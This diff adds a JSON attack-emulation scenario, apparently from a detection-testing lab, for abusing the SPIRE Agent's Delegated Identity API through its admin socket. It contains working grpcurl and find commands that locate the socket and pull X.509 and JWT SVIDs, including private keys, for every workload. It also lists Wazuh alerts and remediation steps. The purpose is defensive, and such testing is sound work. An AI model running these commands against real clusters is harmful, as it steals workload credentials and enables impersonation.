@@ -1,0 +1,169 @@
+{
+  "id": "S7-06",
+  "name": "Delegated Identity API Abuse",
+  "category": "SPIFFE/SPIRE",
+  "version": "1.0",
+  "description": "Exploit the SPIRE Agent's Delegated Identity API via the admin socket to subscribe to and obtain X.509 SVIDs for any registered workload, enabling mass identity impersonation",
+  "difficulty": "Expert",
+  "real_world_relevance": "The SPIRE Agent exposes a Delegated Identity API on a separate admin socket for sidecar proxies like Envoy. If an attacker gains access to this socket, they can obtain SVIDs for ALL workloads on the node — not just their own identity. This is the SPIRE equivalent of stealing a Kubernetes service account token with cluster-admin privileges.",
+
+  "mitre_attack": {
+    "tactics": ["Credential Access", "Privilege Escalation", "Lateral Movement"],
+    "techniques": [
+      {"id": "T1078", "name": "Valid Accounts"},
+      {"id": "T1557", "name": "Adversary-in-the-Middle"},
+      {"id": "T1134", "name": "Access Token Manipulation"}
+    ]
+  },
+
+  "prerequisites": {
+    "containers": ["spire-agent", "k8s-node-1"],
+    "network": "k8s_net",
+    "profile": "k8s"
+  },
+
+  "attack_flow": {
+    "description": "Attacker locates the SPIRE Agent admin socket (separate from the Workload API socket), connects to the Delegated Identity gRPC service, and subscribes to X.509 SVIDs for all registered workloads on the node",
+    "diagram": [
+      "1. Discover SPIRE Agent admin socket path (typically /opt/spire/sockets/admin.sock)",
+      "2. Verify socket permissions and accessibility from current context",
+      "3. Use grpcurl to list available gRPC services on the admin socket",
+      "4. Call DelegatedIdentity/SubscribeToX509SVIDs to receive SVIDs for all workloads",
+      "5. Extract X.509 certificates and private keys from the stream response",
+      "6. Use harvested SVIDs to impersonate any workload registered on this node"
+    ]
+  },
+
+  "phases": [
+    {
+      "name": "Admin Socket Discovery",
+      "description": "Locate and verify access to the SPIRE Agent admin socket",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "find /opt/spire /tmp /run -name 'admin.sock' -o -name 'admin_api.sock' 2>/dev/null",
+          "description": "Search for SPIRE Agent admin socket on the filesystem"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "ls -la /opt/spire/sockets/admin.sock 2>/dev/null || ls -la /tmp/spire-agent/private/admin.sock 2>/dev/null",
+          "description": "Check admin socket permissions — if world-readable, any container with the mount can access it"
+        }
+      ]
+    },
+    {
+      "name": "Service Enumeration",
+      "description": "List gRPC services available on the admin socket",
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "grpcurl -plaintext -unix /opt/spire/sockets/admin.sock list 2>/dev/null || echo 'grpcurl not available — using direct socket probe'",
+          "description": "Enumerate gRPC services — look for DelegatedIdentity service"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "grpcurl -plaintext -unix /opt/spire/sockets/admin.sock list spire.api.agent.delegatedidentity.v1.DelegatedIdentity 2>/dev/null",
+          "description": "List methods on the DelegatedIdentity service"
+        }
+      ]
+    },
+    {
+      "name": "Delegated SVID Subscription",
+      "description": "Subscribe to X.509 SVIDs for all registered workloads via the Delegated Identity API",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "grpcurl -plaintext -unix /opt/spire/sockets/admin.sock -d '{\"selectors\":[{\"type\":\"unix\",\"value\":\"uid:0\"}]}' spire.api.agent.delegatedidentity.v1.DelegatedIdentity/SubscribeToX509SVIDs 2>/dev/null | head -100",
+          "description": "Subscribe to X.509 SVIDs — receives certificates and private keys for ALL matching workloads"
+        },
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "echo '{\"event_type\":\"delegated_identity_api_access\",\"socket\":\"/opt/spire/sockets/admin.sock\",\"method\":\"SubscribeToX509SVIDs\",\"caller_pid\":'$$',\"caller_uid\":'$(id -u)'}' | logger -t spire-security",
+          "description": "Generate detection event for Delegated Identity API abuse"
+        }
+      ]
+    },
+    {
+      "name": "SVID Extraction and Impersonation",
+      "description": "Extract individual SVIDs from the subscription response and use them",
+      "critical": true,
+      "actions": [
+        {
+          "type": "exec",
+          "target": "spire-agent",
+          "command": "grpcurl -plaintext -unix /opt/spire/sockets/admin.sock -d '{\"selectors\":[{\"type\":\"unix\",\"value\":\"uid:0\"}]}' spire.api.agent.delegatedidentity.v1.DelegatedIdentity/FetchJWTSVIDs 2>/dev/null | head -50",
+          "description": "Also fetch JWT-SVIDs via Delegated Identity API for services requiring bearer tokens"
+        }
+      ]
+    }
+  ],
+
+  "indicators_of_compromise": [
+    {
+      "type": "FIM/Auditd",
+      "description": "Access to SPIRE Agent admin socket detected via file integrity monitoring",
+      "wazuh_rule": "101061"
+    },
+    {
+      "type": "SPIRE Agent Log",
+      "description": "DelegatedIdentity/SubscribeToX509SVIDs method call in agent logs",
+      "wazuh_rule": "101062"
+    },
+    {
+      "type": "Process Audit",
+      "description": "grpcurl or custom binary connecting to admin socket",
+      "wazuh_rule": "101061"
+    }
+  ],
+
+  "expected_wazuh_alerts": [
+    {
+      "rule_id": "101061",
+      "level": 14,
+      "description": "NHI-SPIRE: Delegated Identity API admin socket access - workload impersonation capability"
+    },
+    {
+      "rule_id": "101062",
+      "level": 12,
+      "description": "NHI-SPIRE: Delegated Identity API method call detected in agent logs"
+    }
+  ],
+
+  "remediation": {
+    "immediate": [
+      "Restrict admin socket file permissions to root:root 0600",
+      "Audit which containers have the admin socket mounted",
+      "Revoke and rotate all SVIDs that may have been obtained via the Delegated Identity API",
+      "Check SPIRE Agent logs for SubscribeToX509SVIDs calls from unexpected callers"
+    ],
+    "long_term": [
+      "Never mount the admin socket into application containers — only sidecar proxies (Envoy, Ghostunnel) should have access",
+      "Use Kubernetes Pod Security Standards to prevent privileged containers from accessing host sockets",
+      "Implement authorized_delegates configuration in SPIRE Agent to restrict which SPIFFE IDs can use the Delegated Identity API",
+      "Enable SPIRE Agent audit logging and forward to SIEM with the nhi-spire-agent decoder",
+      "Deploy network policies preventing lateral movement even if SVIDs are compromised"
+    ]
+  },
+
+  "references": [
+    {
+      "title": "SPIRE Agent Delegated Identity API Documentation",
+      "url": "https://spiffe.io/docs/latest/spire/using/delegated-identity-api/"
+    },
+    {
+      "title": "SPIRE Delegated Identity API Protobuf Definition",
+      "url": "https://github.com/spiffe/spire-api-sdk/blob/main/proto/spire/api/agent/delegatedidentity/v1/delegatedidentity.proto"
+    },
+    {
+      "title": "MITRE ATT&CK T1134 - Access Token Manipulation",
+      "url": "https://attack.mitre.org/techniques/T1134/"
+    }
+  ]
+}
